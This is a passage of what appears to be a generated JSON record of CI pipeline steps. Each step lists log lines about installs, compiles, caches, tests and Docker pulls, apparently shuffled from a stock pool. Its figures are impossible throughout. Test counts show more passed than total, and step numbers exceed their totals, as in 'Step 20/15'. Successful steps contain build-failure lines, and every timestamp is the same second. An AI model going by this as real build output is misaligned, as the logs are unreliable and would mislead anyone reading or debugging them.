          "\u2713 Task completed in 830ms",
          "Step 2/16: Installing dependencies",
          "Waiting...",
          "Finished.",
          "[12:46:03] DEBUG: Query executed in 46ms",
          "  PASS: test_cache_hit (376ms)",
          "Cache hit for key-4287",
          "Compiling components/app.ts...",
          "Completed.",
          "[12:46:03] DEBUG: Memory usage: 1958MB",
          "Uploading artifact 'dist' (20 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (493MB)",
          "\u2713 Task completed in 2844ms",
          "Building Docker image...",
          "[12:46:03] DEBUG: Connection pool: 11 active",
          "Already up to date.",
          "Image pulled successfully",
          "Finished.",
          "[12:46:03] INFO: Cache refreshed",
          "[12:46:03] DEBUG: Memory usage: 1372MB",
          "Pulling image: alpine:3.11",
          "\u2713 test completed",
          "Environment: development",
          "Cache invalidated: node_modules",
          "[12:46:03] DEBUG: Memory usage: 1958MB",
          "Pulling image: python:latest",
          "Finished.",
          "OK",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Loading...",
          "Tests: 286 passed, 288 total",
          "Loading...",
          "[12:46:03] INFO: Starting build process",
          "npm notice: created a lockfile",
          "[12:46:03] WARN: Deprecated API usage",
          "Pushing to registry...",
          "[12:46:03] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 13/15: Testing",
          "Compiling src/handler.rs...",
          "OK",
          "Platform: win32-x64",
          "Already up to date.",
          "\u2713 Task completed in 2785ms",
          "Fetching from https://docker.io/package.json",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 33 passed, 19 total",
          "Fetching submodules...",
          "Exception: TypeError",
          "[12:46:03] INFO: Starting build process",
          "Artifact downloaded: 37MB",
          "Compiling utils/utils.go...",
          "Tests: 56 passed, 113 total",
          "Finished.",
          "  PASS: test_user_create (88ms)",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] WARN: Deprecated API usage",
          "Generating source maps...",
          "Waiting...",
          "\u2713 Step 'setup' succeeded",
          "[12:46:03] WARN: Deprecated API usage",
          "Tests: 120 passed, 68 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:03] DEBUG: Query executed in 92ms",
          "[12:46:03] DEBUG: Loading configuration",
          "Compiling lib/service.java...",
          "Completed.",
          "Already up to date.",
          "Step 18/24: Installing dependencies",
          "pip: Installing build dependencies...",
          "Pulling image: alpine:latest",
          "yarn add: Done in 4.18s",
          "[12:46:03] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "[12:46:03] INFO: Processing request",
          "Generating source maps...",
          "[12:46:03] ERROR: Connection failed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-17T12:47:00.929851",
        "finished_at": "2025-12-17T12:47:03.690037",
        "log_lines": [
          "=== Step: checkout ===",
          "Creating production build...",
          "Test Suites: 30 passed, 9 total",
          "Compiling src/handler.rs...",
          "NODE_ENV=test",
          "npm install: resolved 881 packages",
          "\u2713 All checks passed",
          "Step 20/15: Testing",
          "Verifying...",
          "Uploading artifact 'dist' (22 files)",
          "[12:46:03] DEBUG: Query executed in 95ms",
          "Cache saved successfully",
          "Processing...",
          "Layer 8/8: COPY command",
          "Already up to date.",
          "[12:46:03] WARN: Deprecated API usage",
          "Step 4/18: Building",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/main.py...",
          "npm notice: package.json updated",
          "Time: 117.851s",
          "yarn add: Done in 15.25s",
          "\u2713 Step 'build' succeeded",
          "Step 17/20: Installing dependencies",
          "Creating production build...",
          "\u2717 build failed with exit code 28",
          "Step 17/25: Deploying",
          "[12:46:03] INFO: Connecting to database",
          "Compiling lib/utils.go...",
          "Test Suites: 8 passed, 27 total",
          "HEAD is now at 333e9d1",
          "Creating production build...",
          "Cache invalidated: build",
          "[12:46:03] DEBUG: Memory usage: 1842MB",
          "Completed.",
          "Cache miss for key-9402",
          "Transforming 357 files...",
          "Time: 99.209s",
          "Step 11/23: Testing",
          "pip: Collecting webpack",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4798ms",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] INFO: Processing request",
          "npm install: added 94 packages",
          "Cache hit for key-9604",
          "TLS handshake completed",
          "Compiling components/utils.go...",
          "Uploading artifact 'build' (30 files)",
          "[12:46:03] DEBUG: Loading configuration",
          "Test Suites: 40 passed, 21 total",
          "Processing...",
          "Step 8/15: Linting",
          "Compiling components/index.js...",
          "npm notice: created a lockfile",
          "pip: Collecting prettier",
          "Installing prettier@2.20.6",
          "Time: 3.353s",
          "Creating production build...",
          "Time: 119.934s",
          "Step 6/24: Running migrations",
          "Bundling runtime.js",
          "Success!",
          "  PASS: integration/test_auth_login.spec.js",
          "npm install: resolved 912 packages",
          "Waiting...",
          "Step 10/25: Linting",
          "TLS handshake completed",
          "Switched to branch 'feature/task-776'",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "[12:46:03] DEBUG: Query executed in 82ms",
          "[12:46:03] DEBUG: Connection pool: 5 active",
          "[12:46:03] DEBUG: Query executed in 81ms",
          "pip: Downloading jest-3.5.tar.gz",
          "[12:46:03] DEBUG: Memory usage: 168MB",
          "Fetching from https://googleapis.com/package.json",
          "Coverage: 88% statements, 81% branches",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Layer 1/11: RUN command",
          "Step 10/15: Linting",
          "Artifact downloaded: 30MB",
          "Loading...",
          "Step 3/23: Deploying",
          "\u2713 package completed",
          "Checking out develop branch",
          "Success!",
          "[12:46:03] DEBUG: Initializing service",
          "Done.",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling components/app.ts...",
          "Coverage: 70% statements, 70% branches",
          "Fetching from https://pypi.org/package.json",
          "[12:46:03] DEBUG: Query executed in 68ms",
          "  PASS: test_cache_hit (303ms)",
          "[12:46:03] INFO: Cache refreshed",
          "Exception: ValueError",
          "Fetching from https://registry.npmjs.org/package.json",
          "yarn add: Done in 22.85s",
          "Minifying app.js",
          "Cache hit for key-2417",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:03] INFO: Processing request",
          "Environment: development",
          "yarn add: Done in 6.91s",
          "Snapshots: 32 passed, 43 total",
          "\u2713 Step 'install' succeeded",
          "Step 1/15: Running migrations",
          "Finished.",
          "Compiling components/handler.rs...",
          "GET /health - 200 (17ms)",
          "Step 9/17: Running migrations",
          "[12:46:03] INFO: Processing request",
          "pip: Installing build dependencies...",
          "[12:46:03] DEBUG: Loading configuration",
          "pip: Downloading jest-4.5.tar.gz",
          "yarn add: Done in 25.0s",
          "HEAD is now at 716a658",
          "Building Docker image...",
          "Using Python 3.12",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:03] DEBUG: Initializing service",
          "Cache invalidated: dependencies",
          "Verifying...",
          "Step 9/23: Linting",
          "Uploading artifact 'coverage' (24 files)",
          "Ran 73 tests in 8s",
          "Step 10/23: Testing",
          "[12:46:03] DEBUG: Query executed in 75ms",
          "Cache hit for key-2854",
          "\u2713 Task completed in 1909ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Bundling styles.css",
          "Processing...",
          "pip: Downloading eslint-4.16.tar.gz",
          "Loading...",
          "[12:46:03] DEBUG: Initializing service",
          "Completed.",
          "Cache restored successfully (258MB)",
          "Cache invalidated: dependencies",
          "yarn add: Done in 7.94s",
          "  PASS: test_cache_hit (158ms)",
          "Switched to branch 'hotfix/task-705'",
          "Artifact downloaded: 16MB",
          "HEAD is now at e9a8360",
          "[12:46:03] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "OK",
          "Switched to branch 'bugfix/task-154'",
          "\u2717 build failed with exit code 71",
          "[12:46:03] DEBUG: Memory usage: 1145MB",
          "Loading...",
          "Generating source maps...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-17T12:47:03.690037",
        "finished_at": "2025-12-17T12:47:10.590502",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 10/20: Linting",
          "Waiting...",
          "Compiling lib/utils.go...",
          "Using Node.js 16.20.7",
          "Artifact uploaded: dist.zip (66MB)",
          "Exception: ValueError",
          "Compiling src/main.py...",
          "WARNING: express has known vulnerabilities",
          "[12:46:03] ERROR: Connection failed",
          "Done.",
          "Coverage: 89% statements, 62% branches",
          "npm install: resolved 318 packages",
          "pip: Downloading react-4.0.tar.gz",
          "Snapshots: 23 passed, 47 total",
          "Platform: win32-x64",
          "Uploading artifact 'dist' (15 files)",
          "FAILED: test_db_connect",
          "[12:46:03] DEBUG: Query executed in 21ms",
          "Processing...",
          "Environment: test",
          "Artifact downloaded: 20MB",
          "Compiling src/main.py...",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:46:03] DEBUG: Query executed in 99ms",
          "\u2713 Step 'install' succeeded",
          "Cache restored successfully (321MB)",
          "Transforming 206 files...",
          "Layer 6/14: COPY command",
          "\u2713 Task completed in 4119ms",
          "Exception: TypeError",
          "pip install: Successfully installed lodash-4.15",
          "Test Suites: 38 passed, 17 total",
          "[12:46:03] INFO: Cache refreshed",
          "Creating production build...",
          "[12:46:03] DEBUG: Loading configuration",
          "Already up to date.",
          "Switched to branch 'feature/task-606'",
          "[12:46:03] DEBUG: Query executed in 43ms",
          "[12:46:03] INFO: Connecting to database",
          "Compiling components/index.js...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (56MB)",
          "GET /api - 200 (6ms)",
          "Completed.",
          "Environment: development",
          "Artifact downloaded: 19MB",
          "Step 2/16: Linting",
          "Step 8/24: Installing dependencies",
          "NODE_ENV=test",
          "Exception: TypeError",
          "Fetching submodules...",
          "Time: 75.74s",
          "[12:46:03] DEBUG: Loading configuration",
          "Compiling utils/handler.rs...",
          "Compiling utils/utils.go...",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] INFO: Cache refreshed",
          "Step 13/20: Testing",
          "[12:46:03] WARN: Deprecated API usage",
          "Completed.",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] INFO: Cache refreshed",
          "[12:46:03] ERROR: Connection failed",
          "Fetching submodules...",
          "Uploading artifact 'dist' (4 files)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 9/23: Linting",
          "  PASS: test_api_health (111ms)",
          "yarn add: Done in 21.4s",
          "NODE_ENV=test",
          "Creating production build...",
          "pip: Downloading prettier-4.15.tar.gz",
          "Step 1/16: Linting",
          "Pulling image: python:latest",
          "Transforming 887 files...",
          "[12:46:03] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-7664",
          "Compiling components/app.ts...",
          "Processing...",
          "[12:46:03] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Building Docker image...",
          "Finished.",
          "Completed.",
          "Bundling vendor.js",
          "\u2713 test completed",
          "Ready.",
          "GET /status - 201 (67ms)",
          "Test Suites: 28 passed, 37 total",
          "Building Docker image...",
          "Time: 66.366s",
          "Coverage: 95% statements, 75% branches",
          "\u2713 All checks passed",
          "Tests: 221 passed, 253 total",
          "Connection established",
          "Cache miss for key-7593",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (83MB)",
          "\u2717 build failed with exit code 1",
          "[12:46:03] DEBUG: Memory usage: 187MB",
          "Step 2/18: Linting",
          "Step 11/16: Building",
          "Bundling main.css",
          "[12:46:03] DEBUG: Connection pool: 20 active",
          "\u2713 All checks passed",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:03] DEBUG: Memory usage: 1355MB",
          "GET /api - 201 (88ms)",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "Step 20/22: Deploying",
          "Bundling vendor.css",
          "npm install: added 168 packages",
          "Waiting...",
          "[12:46:03] DEBUG: Memory usage: 1287MB",
          "[12:46:03] INFO: Starting build process",
          "\u2713 All checks passed",
          "GET /health - 201 (33ms)",
          "Ready.",
          "Waiting...",
          "Step 4/24: Installing dependencies",
          "POST /upload - 201 (433ms)",
          "Artifact uploaded: dist.zip (23MB)",
          "Compiling src/service.java...",
          "\u2713 Task completed in 4688ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Pulling image: python:latest",
          "OK",
          "OK",
          "Already up to date.",
          "[12:46:03] INFO: Connecting to database",
          "Optimizing 17 modules...",
          "Creating production build...",
          "Coverage: 92% statements, 86% branches",
          "OK",
          "npm notice: created a lockfile",
          "POST /upload - 202 (490ms)",
          "Pulling image: python:3.11",
          "[12:46:03] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (99MB)",
          "Compiling components/app.ts...",
          "[12:46:03] INFO: Connecting to database",
          "Uploading artifact 'coverage' (32 files)",
          "FAILED: test_user_create",
          "WARNING: lodash has known vulnerabilities",
          "Exception: ValueError",
          "Coverage: 73% statements, 97% branches",
          "Using Python 3.9",
          "[12:46:03] WARN: Deprecated API usage",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 test completed",
          "Step 1/18: Linting",
          "Transforming 844 files...",
          "Artifact downloaded: 40MB",
          "GET /health - 201 (39ms)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-17T12:47:10.590502",
        "finished_at": "2025-12-17T12:47:17.490967",
        "log_lines": [
          "=== Step: setup_node ===",
          "Minifying main.js",
          "Compiling src/app.ts...",
          "Cache restored successfully (43MB)",
          "Installing webpack@3.8.2",
          "[12:46:03] INFO: Request completed",
          "Using Node.js 17.16.8",
          "Using Python 3.12",
          "[12:46:03] DEBUG: Query executed in 19ms",
          "Installing jest@5.10.1",
          "Success!",
          "Ready.",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Ran 59 tests in 4s",
          "\u2713 Step 'build' succeeded",
          "Exception: TypeError",
          "Compiling components/handler.rs...",
          "Done.",
          "Artifact downloaded: 41MB",
          "  PASS: test_api_health (93ms)",
          "POST /api - 202 (68ms)",
          "Bundling styles.js",
          "[12:46:03] INFO: Cache refreshed",
          "pip install: Successfully installed webpack-4.2",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Using Node.js 16.18.4",
          "Time: 4.966s",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "[12:46:03] WARN: Deprecated API usage",
          "Tests: 335 passed, 321 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 13/22: Running migrations",
          "Layer 8/14: RUN command",
          "Time: 22.944s",
          "[12:46:03] DEBUG: Connection pool: 6 active",
          "Cache miss for key-3738",
          "\u2713 build completed",
          "Tests: 226 passed, 461 total",
          "Switched to branch 'bugfix/task-283'",
          "Installing react@4.10.6",
          "TLS handshake completed",
          "GET /health - 204 (18ms)",
          "[12:46:03] WARN: Deprecated API usage",
          "\u2713 Task completed in 4207ms",
          "Environment: development",
          "Ready.",
          "NODE_ENV=production",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] DEBUG: Connection pool: 12 active",
          "[12:46:03] INFO: Processing request",
          "Loading...",
          "Cache hit for key-6092",
          "Cache invalidated: node_modules",
          "  PASS: integration/test_cache_hit.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "HEAD is now at 8ebf61e",
          "Artifact downloaded: 44MB",
          "  PASS: integration/test_api_health.spec.js",
          "Step 1/19: Installing dependencies",
          "Installing jest@1.1.1",
          "[12:46:03] DEBUG: Connection pool: 15 active",
          "Fetching from https://amazonaws.com/package.json",
          "WARNING: express has known vulnerabilities",
          "Fetching from https://registry.npmjs.org/package.json",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "[12:46:03] INFO: Starting build process",
          "pip install: Successfully installed jest-5.14",
          "Switched to branch 'feature/task-297'",
          "Completed.",
          "Checking out develop branch",
          "Using Node.js 16.0.1",
          "Switched to branch 'feature/task-578'",
          "pip install: Successfully installed react-2.10",
          "Success!",
          "FAILED: test_auth_login",
          "[12:46:03] INFO: Cache refreshed",
          "Building Docker image...",
          "Connection established",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "[12:46:03] INFO: Starting build process",
          "Verifying...",
          "\u2713 Task completed in 220ms",
          "Coverage: 71% statements, 64% branches",
          "Creating production build...",
          "npm install: resolved 1414 packages",
          "Artifact uploaded: dist.zip (43MB)",
          "Snapshots: 9 passed, 50 total",
          "npm install: resolved 1500 packages",
          "[12:46:03] INFO: Processing request",
          "\u2713 package completed",
          "npm notice: created a lockfile",
          "Cache invalidated: dependencies",
          "WARNING: express has known vulnerabilities",
          "GET /status - 200 (100ms)",
          "[12:46:03] DEBUG: Query executed in 78ms",
          "Artifact uploaded: dist.zip (75MB)",
          "OK",
          "WARNING: webpack has known vulnerabilities",
          "TLS handshake completed",
          "Generating source maps...",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "\u2713 Task completed in 3271ms",
          "Cache invalidated: build",
          "Waiting...",
          "\u2713 validate completed",
          "Ran 194 tests in 47s",
          "Processing...",
          "Connection established",
          "OK",
          "[12:46:03] DEBUG: Query executed in 90ms",
          "[12:46:03] INFO: Connecting to database",
          "NODE_ENV=test",
          "[12:46:03] DEBUG: Memory usage: 630MB",
          "Artifact downloaded: 36MB",
          "Checking out main branch",
          "pip: Downloading jest-2.10.tar.gz",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Waiting...",
          "POST /api - 201 (147ms)",
          "\u2713 Step 'install' succeeded",
          "Using Python 3.11",
          "OK",
          "\u2713 build completed",
          "HEAD is now at 53f115c",
          "Connection established",
          "Step 3/17: Linting",
          "pip: Collecting axios",
          "[12:46:03] INFO: Processing request",
          "npm install: added 394 packages",
          "Generating source maps...",
          "GET /status - 201 (31ms)",
          "Test Suites: 27 passed, 10 total",
          "Waiting...",
          "Step 3/19: Installing dependencies",
          "[12:46:03] INFO: Cache refreshed",
          "[12:46:03] INFO: Connecting to database",
          "Fetching from https://amazonaws.com/package.json",
          "Image pulled successfully",
          "[12:46:03] INFO: Cache refreshed",
          "Processing...",
          "Compiling src/utils.go...",
          "Compiling utils/service.java...",
          "Success!",
          "Already up to date.",
          "OK",
          "Waiting...",
          "Step 10/19: Building",
          "[12:46:03] INFO: Connecting to database",
          "POST /data - 202 (482ms)",
          "Layer 2/9: ENV command",
          "Cache miss for key-4534",
          "[12:46:03] WARN: Deprecated API usage",
          "\u2713 Step 'test' succeeded",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-17T12:47:17.490967",
        "finished_at": "2025-12-17T12:47:24.391432",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Platform: darwin-arm64",
          "Using Python 3.12",
          "Ran 72 tests in 30s",
          "Test Suites: 12 passed, 42 total",
          "Snapshots: 8 passed, 43 total",
          "Layer 3/14: RUN command",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting express",
          "Step 15/15: Linting",
          "npm install: added 133 packages",
          "\u2713 Step 'checkout' succeeded",
          "Ready.",
          "OK",
          "Verifying...",
          "Loading...",
          "[12:46:03] DEBUG: Connection pool: 13 active",
          "\u2713 All checks passed",
          "[12:46:03] DEBUG: Query executed in 62ms",
          "[12:46:03] WARN: Deprecated API usage",
          "Step 14/21: Building",
          "[12:46:03] WARN: Deprecated API usage",
          "Test Suites: 45 passed, 15 total",
          "[12:46:03] INFO: Cache refreshed",
          "WARNING: express has known vulnerabilities",
          "Step 7/18: Linting",
          "Artifact downloaded: 12MB",
          "Switched to branch 'hotfix/task-616'",
          "Fetching submodules...",
          "pip: Collecting express",
          "Using Node.js 20.20.8",
          "Checking out develop branch",
          "Ready.",
          "  PASS: test_user_create (255ms)",
          "[12:46:03] DEBUG: Loading configuration",
          "Compiling components/service.java...",
          "Compiling components/utils.go...",
          "Coverage: 82% statements, 72% branches",
          "Already up to date.",
          "Compiling components/index.js...",
          "\u2713 Task completed in 3668ms",
          "\u2717 build failed with exit code 25",
          "Compiling utils/utils.go...",
          "Test Suites: 37 passed, 23 total",
          "Switched to branch 'hotfix/task-925'",
          "yarn add: Done in 28.84s",
          "Building Docker image...",
          "OK",
          "Loading...",
          "[12:46:03] DEBUG: Memory usage: 1333MB",
          "[12:46:03] INFO: Processing request",
          "Fetching from https://pypi.org/package.json",
          "[12:46:03] DEBUG: Memory usage: 1490MB",
          "npm install: resolved 320 packages",
          "[12:46:03] INFO: Cache refreshed",
          "Installing express@1.0.6",
          "GET /health - 204 (24ms)",
          "Finished.",
          "Platform: linux-x64",
          "Using Node.js 17.12.5",
          "Creating production build...",
          "npm install: resolved 1546 packages",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "  PASS: unit/test_cache_hit.spec.js",
          "Tests: 140 passed, 182 total",
          "Step 19/24: Installing dependencies",
          "Transforming 734 files...",
          "Bundling runtime.js",
          "[12:46:03] INFO: Cache refreshed",
          "Exception: TypeError",
          "Cache invalidated: node_modules",
          "[12:46:03] INFO: Cache refreshed",
          "Snapshots: 29 passed, 5 total",
          "Pushing to registry...",
          "\u2713 deploy completed",
          "HEAD is now at e18c646",
          "Platform: win32-x64",
          "Test Suites: 32 passed, 9 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "Optimizing 65 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 19/15: Building",
          "Cache restored successfully (250MB)",
          "Compiling src/index.js...",
          "Platform: win32-x64",
          "Generating source maps...",
          "Cache restored successfully (75MB)",
          "Environment: test",
          "GET /health - 201 (12ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.9",
          "[12:46:03] DEBUG: Loading configuration",
          "pip install: Successfully installed eslint-4.8",
          "[12:46:03] INFO: Request completed",
          "[12:46:03] DEBUG: Connection pool: 15 active",
          "Already up to date.",
          "HEAD is now at e8719f3",
          "Transforming 956 files...",
          "\u2713 Step 'test' succeeded",
          "Installing prettier@4.18.0",
          "Step 15/18: Building",
          "[12:46:03] INFO: Cache refreshed",
          "yarn add: Done in 22.40s",
          "Compiling components/handler.rs...",
          "Building Docker image...",
          "Step 14/18: Deploying",
          "pip: Collecting prettier",
          "[12:46:03] WARN: Deprecated API usage",
          "Processing...",
          "POST /upload - 201 (86ms)",
          "\u2713 Step 'checkout' succeeded",
          "Compiling lib/utils.go...",
          "Optimizing 94 modules...",
          "\u2713 Step 'install' succeeded",
          "Coverage: 75% statements, 74% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed express-4.9",
          "Creating production build...",
          "Finished.",
          "Success!",
          "Finished.",
          "Generating source maps...",
          "Time: 85.596s",
          "Ready.",
          "Completed.",
          "Fetching submodules...",
          "Platform: darwin-arm64",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "OK",
          "npm install: added 21 packages",
          "Step 14/20: Linting",
          "[12:46:03] INFO: Starting build process",
          "[12:46:03] INFO: Cache refreshed",
          "Step 14/22: Building",
          "Processing...",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:03] INFO: Cache refreshed",
          "pip install: Successfully installed axios-4.19",
          "Compiling lib/handler.rs...",
          "Compiling src/app.ts...",
          "Step 1/22: Installing dependencies",
          "Optimizing 50 modules...",
          "[12:46:03] DEBUG: Initializing service",
          "Fetching from https://googleapis.com/package.json",
          "Bundling main.css",
          "Step 3/18: Building",
          "HEAD is now at 26f8bc4",
          "Compiling lib/handler.rs...",
          "npm install: resolved 787 packages",
          "  PASS: test_db_connect (250ms)",
          "Verifying...",
          "Layer 1/12: RUN command",
          "[12:46:03] DEBUG: Query executed in 55ms",
          "Already up to date.",
          "Uploading artifact 'dist' (1 files)",
          "Pulling image: node:3.11",
          "[12:46:03] INFO: Processing request",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-17T12:47:24.391432",
        "finished_at": "2025-12-17T12:47:28.531711",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Bundling vendor.css",
          "Step 15/17: Installing dependencies",
          "[12:46:03] DEBUG: Query executed in 29ms",
          "Optimizing 70 modules...",
          "WARNING: jest has known vulnerabilities",
          "Layer 7/15: ENV command",
          "Step 4/18: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:03] WARN: Deprecated API usage",
          "Success!",
          "Tests: 107 passed, 148 total",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Uploading artifact 'dist' (39 files)",
          "GET /status - 204 (38ms)",
          "Cache miss for key-5852",
          "  PASS: integration/test_user_create.spec.js",
          "Step 14/25: Running migrations",
          "Image pulled successfully",
          "[12:46:03] DEBUG: Connection pool: 17 active",
          "Transforming 733 files...",
          "Environment: development",
          "HEAD is now at 2550807",
          "Environment: test",
          "pip install: Successfully installed webpack-1.16",
          "Compiling components/handler.rs...",
          "Bundling main.css",
          "NODE_ENV=development",
          "Cache restored successfully (21MB)",
          "Pushing to registry...",
          "npm install: added 282 packages",
          "Artifact uploaded: dist.zip (87MB)",
          "\u2713 All checks passed",
          "Bundling styles.js",
          "[12:46:03] DEBUG: Query executed in 52ms",
          "  PASS: test_db_connect (131ms)",
          "Cache miss for key-4801",
          "Ran 150 tests in 24s",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Compiling lib/main.py...",
          "Checking out main branch",
          "POST /api - 200 (224ms)",
          "Step 20/21: Installing dependencies",
          "Finished.",
          "Fetching submodules...",
          "\u2713 Task completed in 3818ms",
          "Step 19/17: Linting",
          "POST /data - 200 (121ms)",
          "Building Docker image...",
          "Optimizing 15 modules...",
          "Using Python 3.12",
          "Waiting...",
          "Creating production build...",
          "Exception: TypeError",
          "Building Docker image...",
          "Exception: TypeError",
          "Done.",
          "\u2713 Task completed in 4138ms",
          "[12:46:03] DEBUG: Query executed in 35ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 2715ms",
          "Optimizing 48 modules...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling lib/utils.go...",
          "Processing...",
          "Ready.",
          "Building Docker image...",
          "\u2713 Step 'build' succeeded",
          "[12:46:03] DEBUG: Connection pool: 13 active",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Minifying app.js",
          "Connection established",
          "Uploading artifact 'coverage' (44 files)",
          "GET /health - 201 (8ms)",
          "Step 14/19: Installing dependencies",
          "Artifact downloaded: 7MB",
          "Time: 22.486s",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] WARN: Deprecated API usage",
          "\u2713 Task completed in 2061ms",
          "  PASS: test_api_health (450ms)",
          "Time: 100.937s",
          "Step 11/21: Deploying",
          "Tests: 468 passed, 120 total",
          "  PASS: test_api_health (201ms)",
          "Step 16/15: Installing dependencies",
          "Switched to branch 'feature/task-225'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 86 modules...",
          "Layer 1/15: ENV command",
          "Done.",
          "[12:46:03] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@4.20.10",
          "[12:46:03] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "Tests: 244 passed, 345 total",
          "Ready.",
          "npm install: resolved 639 packages",
          "Layer 5/8: ENV command",
          "Exception: RuntimeError",
          "HEAD is now at c2c32a5",
          "POST /upload - 200 (213ms)",
          "yarn add: Done in 15.73s",
          "Switched to branch 'feature/task-785'",
          "  PASS: test_user_create (327ms)",
          "Ran 97 tests in 47s",
          "Minifying vendor.js",
          "Already up to date.",
          "\u2713 Task completed in 431ms",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Step 14/19: Installing dependencies",
          "Completed.",
          "Fetching from https://gcr.io/package.json",
          "Platform: darwin-arm64",
          "yarn add: Done in 23.3s",
          "\u2717 build failed with exit code 68",
          "GET /api - 204 (54ms)",
          "Switched to branch 'hotfix/task-124'",
          "Already up to date.",
          "\u2713 Task completed in 4491ms",
          "Success!",
          "[12:46:03] INFO: Connecting to database",
          "[12:46:03] DEBUG: Loading configuration",
          "Test Suites: 44 passed, 33 total",
          "Step 4/18: Building",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] DEBUG: Query executed in 87ms",
          "[12:46:03] INFO: Starting build process",
          "Compiling utils/app.ts...",
          "HEAD is now at 6e0dc14",
          "Waiting...",
          "Checking out master branch",
          "Compiling lib/handler.rs...",
          "Time: 19.713s",
          "Done.",
          "\u2713 lint completed",
          "pip: Downloading express-1.13.tar.gz",
          "Cache restored successfully (323MB)",
          "HEAD is now at 7c67451",
          "Compiling lib/app.ts...",
          "Switched to branch 'hotfix/task-617'",
          "Optimizing 40 modules...",
          "Compiling utils/utils.go...",
          "Tests: 86 passed, 68 total",
          "Switched to branch 'bugfix/task-764'",
          "[12:46:03] INFO: Starting build process",
          "Using Node.js 14.14.3",
          "npm install: added 252 packages",
          "Ran 48 tests in 24s",
          "Step 6/18: Running migrations",
          "Optimizing 35 modules...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-17T12:47:28.531711",
        "finished_at": "2025-12-17T12:47:49.233106",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 All checks passed",
          "[12:46:03] WARN: Deprecated API usage",
          "Pulling image: node:latest",
